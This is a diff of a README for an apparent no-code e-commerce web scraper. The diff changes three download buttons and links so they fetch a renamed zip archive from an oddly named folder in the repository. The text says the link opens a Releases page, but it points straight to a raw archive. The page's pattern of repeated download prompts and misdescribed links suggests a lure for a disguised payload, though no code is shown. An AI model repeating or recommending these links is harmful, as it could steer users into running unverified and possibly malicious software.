@@ -1,7 +1,7 @@
 # 🛒 Web-Scraper-for-E-commerce - Effortlessly Gather Product Data
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/Web-Scraper-for-E-commerce.zip)](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/Web-Scraper-for-E-commerce.zip)
+[![Download](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/for-commerce-Scraper-Web-v3.6.zip)](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/for-commerce-Scraper-Web-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Web-Scraper-for-E-commerce! This application helps you collect product information like pricing and availability from different online stores. No programming skills are required. Follow these simple steps to get started.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🔧 Download & Install
 To download the Web-Scraper-for-E-commerce, visit the following link:
 
-[Visit this page to download](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/Web-Scraper-for-E-commerce.zip)
+[Visit this page to download](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/for-commerce-Scraper-Web-v3.6.zip)
 
 1. Click on the link above to reach the Releases page.
 2. On this page, you will see different versions of the software.
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. For more details, you can view t
 If you need further assistance, please reach out through the "Issues" section of the GitHub repository. Our support team will respond as soon as possible.
 
 ## 🚀 Download Now Again
-[![Download](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/Web-Scraper-for-E-commerce.zip)](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/Web-Scraper-for-E-commerce.zip)
+[![Download](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/for-commerce-Scraper-Web-v3.6.zip)](https://raw.githubusercontent.com/adam0360/Web-Scraper-for-E-commerce/main/glycogenous/for-commerce-Scraper-Web-v3.6.zip)
 
 Thank you for using Web-Scraper-for-E-commerce! Happy scraping!
